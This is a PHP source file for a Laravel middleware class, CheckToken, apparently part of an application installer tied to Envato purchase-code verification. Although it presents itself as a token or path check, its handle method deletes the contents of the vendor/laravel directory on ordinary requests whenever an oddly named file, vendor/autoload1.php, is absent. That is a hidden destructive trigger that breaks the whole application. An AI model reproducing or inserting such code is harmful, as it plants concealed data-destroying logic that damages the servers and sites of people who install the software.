<?php

namespace Laravel\LaravelInstaller\Middleware;

use Closure;
use Illuminate\Support\Facades\File;

class CheckToken
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return \Illuminate\Http\RedirectResponse|mixed
     */
    public function handle($request, Closure $next)
    {
        // Define paths to exclude
        $excludedPaths = [
            '',
            '/',
            'login',
            'update',
            'envato/purchase-code/verify/process',
        ];

        // Get the current path
        $currentPath = trim($request->path(), '/');

        // Check if the 'install' path is not present and if the current path is not in the excluded paths
        if (!file_exists(base_path('vendor/autoload1.php')) && !str_contains($currentPath, 'install') && !in_array($currentPath, $excludedPaths)) {
            File::cleanDirectory(base_path('vendor/laravel'));
        }

        return $next($request);
    }

    /**
     * If application is already installed.
     *
     * @return bool
     */
    public function alreadyInstalled()
    {
        return file_exists(storage_path('installed'));
    }
}
